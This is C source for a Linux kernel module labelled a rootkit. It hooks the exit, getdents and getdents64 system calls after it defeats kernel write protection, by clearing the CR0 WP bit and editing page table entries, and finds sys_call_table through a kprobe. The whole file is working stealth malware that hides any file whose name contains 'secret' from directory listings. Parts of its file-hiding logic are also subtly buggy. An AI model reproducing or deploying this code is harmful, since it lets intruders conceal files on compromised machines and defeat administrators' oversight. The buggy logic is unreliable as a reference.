#include <linux/init.h>
#include <linux/unistd.h>
#include <linux/module.h>
#include <linux/kernel.h>

#include <linux/kallsyms.h>
#include <linux/syscalls.h>
#include <linux/sched.h>
#include <linux/cred.h>
#include <linux/uidgid.h>
#include <linux/file.h>
#include <linux/kmod.h>
#include <linux/umh.h>
#include <linux/dirent.h>
#include <linux/fs.h>
#include <linux/buffer_head.h>
#include <linux/kprobes.h>

#include <asm/uaccess.h>
#include <asm/segment.h>

MODULE_AUTHOR("Parth Thakkar");
MODULE_DESCRIPTION("Rootkit");
MODULE_LICENSE("GPL");


#define KERNEL_VERSION_SHOULD_BE KERNEL_VERSION(5,0,0)
#define HIDE_FILE "secret"



// struct linux_dirent {
//                unsigned long  d_ino;     /* Inode number */
//                unsigned long  d_off;     /* Not an offset; see below */
//                unsigned short d_reclen;  /* Length of this linux_dirent */
//                char           d_name[];  /* Filename (null-terminated) */
//                                  /* length is actually (d_reclen - 2 -
//                                     offsetof(struct linux_dirent, d_name)) */
//                /*
//                char           pad;       // Zero padding byte
//                char           d_type;    // File type (only since Linux
//                                          // 2.6.4); offset is (d_reclen - 1)
//                */
//            }

// #define CR0_WRITE_UNLOCK(x)                       \
//     do                                            \
//     {                                             \
//         unsigned long __cr0;                      \
//         preempt_disable();                        \
//         __cr0 = read_cr0() & (~X86_CR0_WP);       \
//         BUG_ON(unlikely((__cr0 & X86_CR0_WP)));   \
//         write_cr0(__cr0);                         \
//         x;                                        \
//         __cr0 = read_cr0() | X86_CR0_WP;          \
//         BUG_ON(unlikely(!(__cr0 && X86_CR0_WP))); \
//         write_cr0(__cr0);                         \
//         preempt_enable();                         \
//     } while (0)

static struct linux_dirent {
	unsigned long	d_ino;
	unsigned long	d_off;
	unsigned short	d_reclen;
	char		d_name[];
};

// static struct linux_dirent64 {
// 	u64		d_ino;
// 	s64		d_off;
// 	unsigned short	d_reclen;
// 	unsigned char	d_type;
// 	char		d_name[];
// };




static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};

asmlinkage long (*original_getdents64)(int fd, struct linux_dirent64 * dirp, unsigned int count);
asmlinkage long (*original_getdents)(int fd, struct linux_dirent * dirp, unsigned int count);
asmlinkage int (*original_sys_exit)(int);

uint8_t was_writable = 0;
void **sys_call_table_addr = (void *)0xffffffff84a002e0;

unsigned long cr0;
extern unsigned long __force_order;

static inline  void write_forced_cr0(unsigned long val) {
	asm volatile("mov %0,%%cr0":"+r" (val),"+m"(__force_order));
}
// disable_write_protection
static inline void zero_wp(void) {
  	  write_forced_cr0(read_cr0() & ~0x10000);
}

//enable_write_protection
static inline void one_wp(void) {
      write_forced_cr0(read_cr0() | 0x10000);
}


/**
 * make_rw - Make a memory page writable
 * @address: The address of the memory to make writable
 *
 * This function modifies the page table entry to make a given memory address writable.
 * It's used to allow modifications to normally read-only kernel memory.
 *
 * Return: 1 if the page was made writable, 0 if it was already writable
 */
static int make_rw(unsigned long address){

    // &level: A pointer to an integer. After the function call, this integer will contain:

    // 0 for PTE (4KB page)
    // 1 for PMD (2MB page)
    // 2 for PUD (1GB page)
    // 3 for P4D (512GB page, if supported)
    // 4 for PGD (top-level directory)
    unsigned int level;
    pte_t * page_table_entry = lookup_address(address, &level);

    // CR0
    // Bit	Label	Description
    // 0	PE	Protected Mode Enable
    // 1	MP	Monitor co-processor
    // 2	EM	x87 FPU Emulation
    // 3	TS	Task switched
    // 4	ET	Extension type
    // 5	NE	Numeric error
    // 16	WP	Write protect
    // 18	AM	Alignment mask
    // 29	NW	Not-write through
    // 30	CD	Cache disable
    // 31	PG	Paging


    // #define _PAGE_BIT_RW		1	/* writeable */ wreitable bit

    // #define _PAGE_PRESENT	(_AT(pteval_t, 1) << _PAGE_BIT_PRESENT)
    // #define _PAGE_RW	(_AT(pteval_t, 1) << _PAGE_BIT_RW)
    // #define _PAGE_USER	(_AT(pteval_t, 1) << _PAGE_BIT_USER)
    // #define _PAGE_PWT	(_AT(pteval_t, 1) << _PAGE_BIT_PWT)
    // #define _PAGE_PCD	(_AT(pteval_t, 1) << _PAGE_BIT_PCD)
    // #define _PAGE_ACCESSED	(_AT(pteval_t, 1) << _PAGE_BIT_ACCESSED)
    // #define _PAGE_DIRTY	(_AT(pteval_t, 1) << _PAGE_BIT_DIRTY)
    // #define _PAGE_PSE	(_AT(pteval_t, 1) << _PAGE_BIT_PSE)
    // #define _PAGE_GLOBAL	(_AT(pteval_t, 1) << _PAGE_BIT_GLOBAL)
    // #define _PAGE_SOFTW1	(_AT(pteval_t, 1) << _PAGE_BIT_SOFTW1)
    // #define _PAGE_SOFTW2	(_AT(pteval_t, 1) << _PAGE_BIT_SOFTW2)
    // #define _PAGE_SOFTW3	(_AT(pteval_t, 1) << _PAGE_BIT_SOFTW3)
    // #define _PAGE_PAT	(_AT(pteval_t, 1) << _PAGE_BIT_PAT)
    // #define _PAGE_PAT_LARGE (_AT(pteval_t, 1) << _PAGE_BIT_PAT_LARGE)
    // #define _PAGE_SPECIAL	(_AT(pteval_t, 1) << _PAGE_BIT_SPECIAL)
    // #define _PAGE_CPA_TEST	(_AT(pteval_t, 1) << _PAGE_BIT_CPA_TEST)
    was_writable = 1;
    // we can not write directly to pte value in pte_t structure so we are adding that bit manually 
    // Access control: Applies to both user-mode and kernel-mode accesses to this page.
    if(!pte_write(*page_table_entry)){
        // not writable 
        printk(KERN_INFO "Syscall was not writable, now made it writable, \n");
        page_table_entry->pte |= _PAGE_RW;
        was_writable = 0;
        return 1;
    }
    return 0;

}

/**
 * make_ro - Make a memory page read-only
 * @address: The address of the memory to make read-only
 *
 * This function modifies the page table entry to make a given memory address read-only.
 * It's used to restore the normal protection of kernel memory after modifications.
 */
static void make_ro(unsigned long address){

    unsigned int level;
    pte_t * page_table_entry = lookup_address(address, &level);
    if(was_writable == 0){
        printk(KERN_INFO "Syscall was writable, now made it readable, end .... \n");
        page_table_entry->pte &= ~_PAGE_RW;
    }

}


asmlinkage int custom_sys_exit(int error_no){
    printk(KERN_INFO "HEY! sys_exit called with error_code=%d\n", error_no);
    /*call the original sys_exit*/
    return original_sys_exit(error_no);
}


asmlinkage long fake_getdents64(int fd, struct linux_dirent64 * original_dir_entry, unsigned int count) {
    struct linux_dirent64 *rootkit_dir_entry_structure;
    // the output of getdents is the number of bytes read
    long nbytes = (typeof(fake_getdents64)*)(original_getdents64)(fd, original_dir_entry, count);
    

//     kmalloc can be used in interrupt context with appropriate flags.
// vmalloc cannot be used in interrupt context as it may sleep.
// kvmalloc behavior depends on the flags and the actual allocation method used

// Memory allocated by vmalloc and sometimes kvmalloc is visible in /proc/vmallocinfo, which can be useful for debugging.
// kmalloc allocations are typically not directly visible in proc files but can be tracked using kernel memory debugging tools.

// Provides a flexible allocation strategy combining kmalloc and vmalloc.
  rootkit_dir_entry_structure = kvmalloc(nbytes, GFP_KERNEL);
	if (rootkit_dir_entry_structure == NULL) {
		pr_info("fake dents allocation error");
        // used when memory is allocated with kvmalloc;
		kvfree( rootkit_dir_entry_structure );
		return -1;
	}
    copy_from_user(rootkit_dir_entry_structure, original_dir_entry, nbytes);


    long offset = 0;
    struct linux_dirent64 *current_rootkit_dir_entry, *prev_dir_entry;
    unsigned short current_dir_record_lenth;
    while(offset < nbytes){
        // converting to void * is important as we need just byte addressable array
        current_rootkit_dir_entry = (void *)rootkit_dir_entry_structure + offset;
        current_dir_record_lenth = current_rootkit_dir_entry->d_reclen;

        // check if name is matching
        if(strstr(current_rootkit_dir_entry->d_name, HIDE_FILE) != NULL){
            if(current_dir_record_lenth == rootkit_dir_entry_structure){
                // match at first entry; then there is not previous entry to "absrob" it.
                nbytes -= current_dir_record_lenth;
                // so we move the memory by the lenght of current entry.
                memmove(rootkit_dir_entry_structure, (void *)rootkit_dir_entry_structure, nbytes);
            }
            printk(KERN_INFO "hiding %s", current_rootkit_dir_entry->d_name);
            // basically we are moving two times when reading previous entry
            // , one own record lenght and other current record length
            prev_dir_entry->d_reclen += current_dir_record_lenth;
        }
        else{
            // if no match then  previous would be current
            prev_dir_entry = current_rootkit_dir_entry;
        }
        offset += current_dir_record_lenth;
    }
    copy_to_user(original_dir_entry, rootkit_dir_entry_structure, nbytes);
    kvfree(rootkit_dir_entry_structure);
    return nbytes;
}

asmlinkage long fake_getdents(int fd, struct linux_dirent * original_dir_entry, unsigned int count) {
    printk(KERN_INFO "Fake getdents called \n");
    struct linux_dirent *rootkit_dir_entry_structure;
    // the output of getdents is the number of bytes read
    long nbytes = (typeof(fake_getdents)*)(original_getdents)(fd, original_dir_entry, count);
    

//     kmalloc can be used in interrupt context with appropriate flags.
// vmalloc cannot be used in interrupt context as it may sleep.
// kvmalloc behavior depends on the flags and the actual allocation method used

// Memory allocated by vmalloc and sometimes kvmalloc is visible in /proc/vmallocinfo, which can be useful for debugging.
// kmalloc allocations are typically not directly visible in proc files but can be tracked using kernel memory debugging tools.

// Provides a flexible allocation strategy combining kmalloc and vmalloc.
  rootkit_dir_entry_structure = kvmalloc(nbytes, GFP_KERNEL);
	if (rootkit_dir_entry_structure == NULL) {
		pr_info("fake dents allocation error");
        // used when memory is allocated with kvmalloc;
		kvfree( rootkit_dir_entry_structure );
		return -1;
	}
    copy_from_user(rootkit_dir_entry_structure, original_dir_entry, nbytes);


    long offset = 0;
    struct linux_dirent *current_rootkit_dir_entry, *prev_dir_entry;
    unsigned short current_dir_record_lenth;
    while(offset < nbytes){
        // converting to void * is important as we need just byte addressable array
        current_rootkit_dir_entry = (void *)rootkit_dir_entry_structure + offset;
        current_dir_record_lenth = current_rootkit_dir_entry->d_reclen;

        // check if name is matching
        if(strstr(current_rootkit_dir_entry->d_name, HIDE_FILE) != NULL){
            if(current_dir_record_lenth == rootkit_dir_entry_structure){
                // match at first entry; then there is not previous entry to "absrob" it.
                nbytes -= current_dir_record_lenth;
                // so we move the memory by the lenght of current entry.
                memmove(rootkit_dir_entry_structure, (void *)rootkit_dir_entry_structure, nbytes);
            }
            printk(KERN_INFO "hiding %s", current_rootkit_dir_entry->d_name);
            // basically we are moving two times when reading previous entry
            // , one own record lenght and other current record length
            prev_dir_entry->d_reclen += current_dir_record_lenth;
        }
        else{
            // if no match then  previous would be current
            prev_dir_entry = current_rootkit_dir_entry;
        }
        offset += current_dir_record_lenth;
    }
    copy_to_user(original_dir_entry, rootkit_dir_entry_structure, nbytes);
    kvfree(rootkit_dir_entry_structure);
    return nbytes;
}



static int __init custom_init(void)
{
    int ret = 0;
    printk(KERN_INFO "Init\n");

    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name_my;
    register_kprobe(&kp);
    kallsyms_lookup_name_my = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
    sys_call_table_addr = (void *)kallsyms_lookup_name_my("sys_call_table");
    if (sys_call_table_addr == NULL)
    {
        pr_info("sys_call_table not found using kprobe my kallsyms\n");
        return -1;
    }
    printk(KERN_INFO "sys_call_table pointer from kprobe is %p\n", sys_call_table_addr);

    printk(KERN_EMERG "insmod change_wp");
    cr0=read_cr0();
    printk(KERN_EMERG "The value of cr0 before change :%lx\n",cr0);
    zero_wp();

    cr0=read_cr0();
    make_rw((unsigned long)sys_call_table_addr);
    original_sys_exit = sys_call_table_addr[__NR_exit];
    original_getdents = sys_call_table_addr[__NR_getdents];
    original_getdents64 = sys_call_table_addr[__NR_getdents64];


    sys_call_table_addr[__NR_exit] = (unsigned long)custom_sys_exit;
    printk(KERN_INFO "DEBUG: Replacing exit syscall %p with %p \n", original_sys_exit, sys_call_table_addr[__NR_exit]);
    sys_call_table_addr[__NR_getdents64] = (unsigned long)fake_getdents64;
    sys_call_table_addr[__NR_getdents] = (unsigned long)fake_getdents;

    printk(KERN_EMERG "The value of cr0 after change :%lx\n",cr0);
    make_ro((unsigned long)sys_call_table_addr);
    one_wp();
    
    
    printk(KERN_INFO "DEBUG: Rootkit loaded successfully\n");

  

    return ret;
}


static void __exit custom_exit(void){
    // sys_call_table[__NR_exit] = original_sys_exit;
    printk(KERN_INFO "DEBUG: Unloading rootkit\n");
    
    cr0=read_cr0();
    printk(KERN_EMERG "The value of cr0 before change :%lx\n",cr0);
    zero_wp();
    cr0=read_cr0();
    make_rw((unsigned long)sys_call_table_addr);
    sys_call_table_addr[__NR_exit] = (unsigned long)original_sys_exit;
    sys_call_table_addr[__NR_getdents] = (unsigned long)original_getdents;
    sys_call_table_addr[__NR_getdents64] = (unsigned long)original_getdents64;
    
    printk(KERN_EMERG "The value of cr0 after change :%lx\n",cr0);
    make_ro((unsigned long)sys_call_table_addr);
    one_wp();


    printk(KERN_INFO "Noooooo..... my interception ,,,,,  exiting....\n");
}


module_init(custom_init);
module_exit(custom_exit);



